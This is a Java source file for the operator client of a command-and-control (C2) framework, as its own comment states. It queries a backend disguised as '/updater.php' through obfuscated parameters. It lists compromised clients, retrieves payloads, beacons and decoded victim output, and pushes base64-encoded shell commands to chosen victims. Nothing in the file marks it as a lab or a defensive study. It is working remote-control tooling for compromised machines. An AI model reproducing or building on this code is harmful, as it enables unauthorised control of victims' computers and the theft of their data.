import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.HashMap;
import java.util.Objects;
import java.util.Base64;

public class RequestCalls {
    private final HttpClient client;
    private final String hostIP;
    private final String port;
    private final String baseEndPoint;
    private final HashMap<String, String> queryToParam;
    public RequestCalls(String hostIP, String port){
        client = HttpClient.newHttpClient();
        // Map a C2 query it's GET parameter
        this.queryToParam = new HashMap<>();
        queryToParam.put("FINDCLIENTS","?OYNsOOhC7L=pings");
        queryToParam.put("FINDCLIENTRESPONSES","?OYNsOOhC7L=responses");
        queryToParam.put("FINDCLIENTRESPONSE","?OYNsOOhC7L=");
        queryToParam.put("REMOVECLIENT","?r8ojR2jJ=");
        queryToParam.put("GETLASTPING","?l4St=");
        queryToParam.put("GETPAYLOAD","?g3tp4y=");
        queryToParam.put("GETBEACON","?g3tb34c=");
        queryToParam.put("GETHOST","?g3th0sT=");
        queryToParam.put("GETINFO","?lnf0=");
        this.hostIP = hostIP;
        this.port = port;
        this.baseEndPoint = "http://"+hostIP+":"+port+"/updater.php";
    }
    public String queryBackend(String query, String param, int OS) throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET(queryToParam.get(query)+param, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            return Objects.equals(resp.body(), "") ? "None" : resp.body();
        }
    }
    /*public String findClients(int OS) throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET("?OYNsOOhC7L=pings", OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            return Objects.equals(resp.body(), "") ? "None" : resp.body();
        }
    }
    public String removeClient(String id, int OS) throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET("?r8ojR2jJ="+id, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            return Objects.equals(resp.body(), "") ? "None" : resp.body();
        }
    }*/
    /*public String findClientReads() throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET("?OYNsOOhC7L=reads");
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            return Objects.equals(resp.body(), "") ? "None" : resp.body();
        }
    }*/
    /*public String findClientResponses(int OS) throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET("?OYNsOOhC7L=responses", OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            return Objects.equals(resp.body(), "") ? "None" : resp.body();
        }
    }
    public String FetchResponse(String IP, int OS) throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET("?OYNsOOhC7L="+IP, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            String retStr = Objects.equals(resp.body(), "") ? "None" : resp.body();
            if(!retStr.equals("None")){
                byte[] returnBytes = Base64.getMimeDecoder().decode(retStr);
                String newReturn = new String(returnBytes, StandardCharsets.UTF_8); // Decode base64 encoded output from client output
                return newReturn;
            }
            return retStr;
        }
    }
    public String GetLastPing(String IP, int OS) throws IOException, InterruptedException {
        HttpResponse<String> resp = sendGET("?l4St="+IP, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            return Objects.equals(resp.body(), "") ? "None" : resp.body().split("\n")[0];
        }
    }
    public String GetOS(String IP, int OS) throws IOException, InterruptedException { // No need for now
        HttpResponse<String> resp = sendGET("?g3t0S="+IP, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
        }
    }
    public String GetHost(String IP, int OS) throws IOException, InterruptedException { // Add this back
        HttpResponse<String> resp = sendGET("?g3th0sT="+IP, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
        }
    }
    public String GetPayload(String IP, int OS) throws IOException, InterruptedException { // Add this back
        HttpResponse<String> resp = sendGET("?g3tp4y="+IP, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
        }
    }
    public String GetBeacon(String IP, int OS) throws IOException, InterruptedException { // Add this back
        HttpResponse<String> resp = sendGET("?g3tb34c="+IP, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
        }
    }
    public String GetInfo(String ID, int OS) throws IOException, InterruptedException { // Add this back
        HttpResponse<String> resp = sendGET("?lnf0="+ID, OS);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            //System.out.println(resp.body());
            return Objects.equals(resp.body(), "1") ? "None" : resp.body();
        }
    }*/
    public String Push(String command, String cli, int OS) throws IOException, InterruptedException {
        String encoded = Base64.getEncoder().encodeToString(command.getBytes(StandardCharsets.UTF_8));
        String requestBody = "bm6UqYw7fq="+encoded+"&cli="+cli;
        HttpResponse<String> resp = sendPOST(requestBody, OS);
        //System.out.println(command+" "+cli);
        if(resp.statusCode()>399){
            return "Couldn't reach. Firewall issue?";
        }else{
            return Objects.equals(resp.body(), "") ? "None" : resp.body();
        }
    }
    public String getHostIP(){
        return hostIP;
    }
    private HttpResponse<String> sendGET(String param, int OS) throws IOException, InterruptedException {
        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(baseEndPoint+param+"&p="+OS)).GET().timeout(Duration.ofSeconds(5)).build();
        return client.send(req, HttpResponse.BodyHandlers.ofString());
    }
    private HttpResponse<String> sendPOST(String param, int OS) throws IOException, InterruptedException {
        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(baseEndPoint+"?p="+OS)).header("Content-Type", "application/x-www-form-urlencoded").POST(HttpRequest.BodyPublishers.ofString(param)).build();
        return client.send(req, HttpResponse.BodyHandlers.ofString());
    }
}
